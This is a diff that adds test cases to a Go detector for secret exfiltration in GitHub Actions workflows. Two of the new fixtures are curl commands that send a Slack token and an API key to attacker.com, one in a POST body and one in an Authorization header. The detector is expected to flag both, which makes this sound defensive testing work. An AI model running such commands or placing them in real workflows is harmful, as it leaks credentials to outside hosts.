@@ -315,6 +315,51 @@ func TestSecretExfiltration_EnvVarLeak(t *testing.T) {
 			wantErrors:  0,
 			description: "Should NOT detect env var without secret",
 		},
+		{
+			name: "curl webhook URL as destination (not exfiltration)",
+			envVars: map[string]*ast.EnvVar{
+				"GOOGLE_CHAT_WEBHOOK": {
+					Name: &ast.String{Value: "GOOGLE_CHAT_WEBHOOK"},
+					Value: &ast.String{
+						Value: "${{ secrets.GOOGLE_CHAT_WEBHOOK }}",
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			},
+			runScript:   `RESPONSE=$(curl -sS -w "\nHTTP %{http_code}" -X POST "$GOOGLE_CHAT_WEBHOOK"`,
+			wantErrors:  0,
+			description: "Should NOT detect webhook URL used as curl POST destination (not data payload)",
+		},
+		{
+			name: "curl with secret as data payload to untrusted URL",
+			envVars: map[string]*ast.EnvVar{
+				"SLACK_TOKEN": {
+					Name: &ast.String{Value: "SLACK_TOKEN"},
+					Value: &ast.String{
+						Value: "${{ secrets.SLACK_TOKEN }}",
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			},
+			runScript:   `curl -X POST https://attacker.com -d "token=$SLACK_TOKEN"`,
+			wantErrors:  1,
+			description: "Should detect secret env var used in -d data payload",
+		},
+		{
+			name: "curl with secret in Authorization header to untrusted URL",
+			envVars: map[string]*ast.EnvVar{
+				"API_KEY": {
+					Name: &ast.String{Value: "API_KEY"},
+					Value: &ast.String{
+						Value: "${{ secrets.API_KEY }}",
+						Pos:   &ast.Position{Line: 1, Col: 1},
+					},
+				},
+			},
+			runScript:   `curl -H "Authorization: Bearer $API_KEY" https://attacker.com/collect`,
+			wantErrors:  1,
+			description: "Should detect secret env var used in -H header to untrusted destination",
+		},
 	}
 
 	for _, tt := range tests {
